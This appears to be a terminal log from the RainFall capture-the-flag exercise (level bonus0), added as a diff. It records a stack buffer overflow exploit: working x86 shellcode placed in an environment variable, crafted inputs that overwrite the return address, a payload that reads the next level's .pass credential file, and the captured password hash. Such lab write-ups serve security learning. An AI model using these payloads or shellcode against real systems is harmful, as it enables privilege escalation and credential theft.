@@ -1,0 +1,165 @@
+bonus0@RainFall:~$ ./bonus0
+ -
+aaaabbbbccccddddeeee
+ -
+00001111222233334444
+aaaabbbbccccddddeeee00001111222233334444�� 00001111222233334444��
+Segmentation fault (core dumped)
+
+bonus0@RainFall:~$ dmesg
+	...
+[32336.445712] bonus0[6056]: segfault at 33323232 ip 33323232 sp bffff630 error 14
+
+
+
+
+bonus0@RainFall:~$ { python -c 'print("aaaaaaaaaaaaaaaaaaaa")'; python -c 'print("000011112aaaa0000000")'; } | ./bonus0
+ -
+ -
+aaaaaaaaaaaaaaaaaaaa000011112aaaa0000000�� 000011112aaaa0000000��
+Segmentation fault (core dumped)
+bonus0@RainFall:~$ dmesg
+	...
+[32870.749246] bonus0[6083]: segfault at 61616161 ip 61616161 sp bffff630 error 14
+
+
+
+bonus0@RainFall:~$ export SHELLCODE=$(python -c 'print("\x90" * 200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+(gdb) x/32x *environ
+0xbffff7de:	0x4c454853	0x444f434c	0x90903d45	0x90909090
+0xbffff7ee:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7fe:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff80e:	0x90909090	0x90909090	0x90909090	0x90909090
+
+bonus0@RainFall:~$ { python -c 'print("aaaaaaaaaaaaaaaaaaaa")' - ; python -c 'print("000011112\x2e\xf8\xff\xbf0000000")' - ; } | ltrace ./bonus0;
+__libc_start_main(0x80485a4, 1, 0xbffff6b4, 0x80485d0, 0x8048640 <unfinished ...>
+puts(" - " -
+)                                           = 4
+read(0, "aaaaaaaaaaaaaaaaaaaa\n", 4096)               = 21
+strchr("aaaaaaaaaaaaaaaaaaaa\n", '\n')                = "\n"
+strncpy(0xbffff598, "aaaaaaaaaaaaaaaaaaaa", 20)       = 0xbffff598
+puts(" - " -
+)                                           = 4
+read(0, "000011112.\370\377\2770000000\n", 4096)      = 21
+strchr("000011112.\370\377\2770000000\n", '\n')       = "\n"
+strncpy(0xbffff5ac, "000011112.\370\377\2770000000", 20) = 0xbffff5ac
+strcpy(0xbffff5e6, "aaaaaaaaaaaaaaaaaaaa000011112.\370\377"...) = 0xbffff5e6
+strcat("aaaaaaaaaaaaaaaaaaaa000011112.\370\377"..., "000011112.\370\377\2770000000\364\017\375\267") = "aaaaaaaaaaaaaaaaaaaa000011112.\370\377"...
+puts("aaaaaaaaaaaaaaaaaaaa000011112.\370\377"...aaaaaaaaaaaaaaaaaaaa000011112.���0000000�� 000011112.���0000000��
+)     = 70
+--- Called exec() ---
+__libc_start_main(0x8049730, 1, 0xbfffff14, 0x80594e0, 0x8059550 <unfinished ...>
+__errno_location()                                    = 0xb7e2b8c8
+_setjmp(0xbffffdc4, 0xb7fffa74, 0, 0xb7fdcb48, 1)     = 0
+getpid()                                              = 6131
+sigfillset(0xbffffc48)                                = 0
+sigaction(17, 0xbffffc44, NULL)                       = 0
+geteuid()                                             = 2010
+getppid()                                             = 6130
+__vsnprintf_chk(0x8061285, 27, 1, -1, 0x805b274)      = 4
+malloc(16)                                            = 0x08064008
+getcwd(NULL, 0)                                       = ""
+__ctype_b_loc()                                       = 0xb7e2b8d4
+__ctype_b_loc()                                       = 0xb7e2b8d4
+__ctype_b_loc()                                       = 0xb7e2b8d4
+strchrnul(0x8059931, 61, 0x805afa0, 0x8061280, 8)     = 0x8059931
+strlen("/home/user/bonus0")                           = 17
+malloc(22)                                            = 0x08064038
+mempcpy(0x8064038, 0x805992e, 3, 0x8061280, 8)        = 0x806403b
+mempcpy(0x806403c, 0x8064020, 17, 0x8061280, 8)       = 0x806404d
+malloc(16)                                            = 0x08064058
+isatty(0)                                             = 0
+sigaction(2, NULL, 0xbffffca4)                        = 0
+sigfillset(0xbffffca8)                                = 0
+sigaction(2, 0xbffffca4, NULL)                        = 0
+sigaction(3, NULL, 0xbffffca4)                        = 0
+sigfillset(0xbffffca8)                                = 0
+sigaction(3, 0xbffffca4, NULL)                        = 0
+sigaction(15, NULL, 0xbffffcc4)                       = 0
+sigfillset(0xbffffcc8)                                = 0
+sigaction(15, 0xbffffcc4, NULL)                       = 0
+read(0, "", 8192)                                     = 0
+_setjmp(0xbffffd00, 0x8061740, 8192, -1, -1)          = 0
+_setjmp(0xbffffd00, 0x8061740, 8192, -1, 0xb7fd0ff4)  = 0
+_exit(0 <unfinished ...>
++++ exited (status 0) +++
+
+
+
+
+bonus0@RainFall:~$ ln -s /home/user/bonus1/.pass /tmp/xxx
+
+>>> for i in "/tmp/xxx":
+...     print(f"\\x{hex(ord(i))[1:]}")
+...
+\xx2f
+\xx74
+\xx6d
+...
+
+# /bin/cat /tmp/xxx
+bonus0@RainFall:~$ export SHELLCODE=$(python -c 'print("\x90" * 50 + "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x78\x78\x78\x68\x2f\x74\x6d\x70\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80")')
+
+bonus0@RainFall:~$ { python -c 'print("a" * 20)'; python -c 'print("000011112\x86\xf8\xff\xbf0000000")'; } | ./bonus0
+ -
+ -
+aaaaaaaaaaaaaaaaaaaa000011112����0000000�� 000011112����0000000��
+/bin/cat: /tmp/xxx: Permission denied
+
+
+bonus0@RainFall:~$ { python -c 'print("a" * 20)'; python -c 'print("000011112\x86\xf8\xff\xbf0000000")'; } | ltrace ./bonus0
+__libc_start_main(0x80485a4, 1, 0xbffff744, 0x80485d0, 0x8048640 <unfinished ...>
+puts(" - " -
+)                                           = 4
+read(0, "aaaaaaaaaaaaaaaaaaaa\n", 4096)               = 21
+strchr("aaaaaaaaaaaaaaaaaaaa\n", '\n')                = "\n"
+strncpy(0xbffff628, "aaaaaaaaaaaaaaaaaaaa", 20)       = 0xbffff628
+puts(" - " -
+)                                           = 4
+read(0, "000011112\206\370\377\2770000000\n", 4096)   = 21
+strchr("000011112\206\370\377\2770000000\n", '\n')    = "\n"
+strncpy(0xbffff63c, "000011112\206\370\377\2770000000", 20) = 0xbffff63c
+strcpy(0xbffff676, "aaaaaaaaaaaaaaaaaaaa000011112\206\370\377"...) = 0xbffff676
+strcat("aaaaaaaaaaaaaaaaaaaa000011112\206\370\377"..., "000011112\206\370\377\2770000000\364\017\375\267") = "aaaaaaaaaaaaaaaaaaaa000011112\206\370\377"...
+puts("aaaaaaaaaaaaaaaaaaaa000011112\206\370\377"...aaaaaaaaaaaaaaaaaaaa000011112����0000000�� 000011112����0000000��
+)  = 70
+--- Called exec() ---
+__libc_start_main(0x8049280, 2, 0xbfffff14, 0x80500d0, 0x8050140 <unfinished ...>
+getpagesize()                                         = 4096
+strrchr("/bin/cat", '/')                              = "/cat"
+setlocale(6, "")                                      = "C"
+bindtextdomain("coreutils", "/usr/share/locale")      = "/usr/share/locale"
+textdomain("coreutils")                               = "coreutils"
+__cxa_atexit(0x804a2f0, 0, 0, 0xb7fd0ff4, 0)          = 0
+getopt_long(2, 0xbfffff14, "benstuvAET", 0x08050840, NULL) = -1
+__fxstat64(3, 1, 0xbffffdfc)                          = 0
+open64("/tmp/xxx", 0, 027777776774)                   = -1
+__errno_location()                                    = 0xb7e2b8c8
+error(0, 13, 0x80508e9, 0xbfffffea, 0/bin/cat: /tmp/xxx: Permission denied
+)                = 0
+exit(1 <unfinished ...>
+__fpending(0xb7fd1a20, 0xb7ffeff4, 0xb7e6e6f1, 0xb7fd0ff4, 0xb7fd0ff4) = 0
+fileno(0xb7fd1a20)                                    = 1
+__freading(0xb7fd1a20, 0xb7ff26b0, 0, 0xb7e960f0, 0)  = 0
+__freading(0xb7fd1a20, 0xb7ff26b0, 0xfbad2084, 0xb7e95ff0, 1) = 0
+fflush(0xb7fd1a20)                                    = 0
+fclose(0xb7fd1a20)                                    = 0
+__fpending(0xb7fd1980, 0xb7ffeff4, 0xb7e6e6f1, 0xb7fd0ff4, 0xb7fd0ff4) = 0
+fileno(0xb7fd1980)                                    = 2
+__freading(0xb7fd1980, 0xb7ff26b0, 0, 0, 0)           = 0
+__freading(0xb7fd1980, 0xb7fd0ff4, 0xb7fd1a20, 0xb7e90449, 0xb7fd1a20) = 0
+fflush(0xb7fd1980)                                    = 0
+fclose(0xb7fd1980)                                    = 0
++++ exited (status 1) +++
+
+
+Changement de shellcode
+
+bonus0@RainFall:~$ export SHELLCODE=$(python -c 'print("\x90" * 80 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/user/bonus1/.pass")')
+
+bonus0@RainFall:~$ { python -c 'print("a" * 20)'; python -c 'print("000011112\x40\xf8\xff\xbf0000000")'; } | ./bonus0
+ -
+ -
+aaaaaaaaaaaaaaaaaaaa000011112@���0000000�� 000011112@���0000000��
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
